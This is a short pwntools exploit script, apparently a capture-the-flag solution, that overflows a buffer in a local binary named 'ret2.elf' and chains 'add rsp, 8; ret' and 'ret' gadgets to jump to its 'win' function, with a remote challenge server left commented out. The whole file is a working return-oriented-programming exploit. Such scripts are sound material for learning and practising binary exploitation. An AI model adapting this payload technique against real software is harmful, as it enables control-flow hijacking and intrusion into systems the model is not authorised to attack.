#!/usr/bin/env python3

from pwn import *

elf = ELF("./ret2.elf")
gadgets = ROP(elf)

# s  = remote("mailman.chal.imaginaryctf.org", 1337)
s = process(elf.path)

def main():
	add_rsp_8_ret = gadgets.find_gadget(['add rsp, 8', 'ret'])[0]
	ret = gadgets.find_gadget(['ret'])[0]
	
	pl = flat(
		cyclic(64),
		p64(0xdeadface),
		p64(add_rsp_8_ret)*11,
		p64(ret),
		p64(ret),
		p64(elf.sym.win)
	)
	
	# gdb.attach(s)
	
	s.sendline(pl)
	s.interactive()

if __name__=="__main__":
	main()